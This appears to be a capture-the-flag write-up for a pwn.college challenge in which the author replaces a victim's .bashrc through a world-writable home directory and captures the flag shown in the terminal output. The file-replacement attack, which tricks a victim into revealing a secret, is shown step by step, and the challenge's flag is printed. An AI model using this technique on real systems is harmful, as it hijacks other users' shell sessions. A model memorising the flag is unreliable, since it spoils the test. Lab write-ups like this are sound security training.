# Overshared Directories

Previously we had write access to .bashrc folder but now that zardus has grown wiser we are not allowed to edit .bashrc, instead we are given write access to `/home/hacker` folder, we need to take advantage of this to edit `.bashrc` to do the same thing it did in previous challenge.

## My Solve

So What we have to do here is `rm .bashrc` file, and then create a new one which we can edit, and then make it do the same thing we did in the last challenge.

```shell
hacker@shenanigans~overshared-directories:~$ cd /home/zardus/
hacker@shenanigans~overshared-directories:/home/zardus$ ls -la
total 20
drwxrwxrwx 2 zardus zardus 4096 Oct 11 07:51 .
drwxr-xr-x 1 root   root   4096 Oct 11 07:51 ..
-rw-r--r-- 1 zardus zardus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zardus zardus  148 Oct 11 07:51 .bashrc
-rw-r--r-- 1 zardus zardus  807 Feb 25  2020 .profile
hacker@shenanigans~overshared-directories:/home/zardus$ rm .bashrc
rm: remove write-protected regular file '.bashrc'? y
hacker@shenanigans~overshared-directories:/home/zardus$ nano .bashrc
hacker@shenanigans~overshared-directories:/home/zardus$ /challenge/victim 
Username: zardus
Password: **********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag;read var;echo
zardus@shenanigans~overshared-directories:~$ *************************************************************-bash: pwn.college{wl_4NbBAlwHjF9K585QRc_O92zS.0FM0EzNxwCM0gjNzEzW}: command not found
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:/home/zardus$ 
```
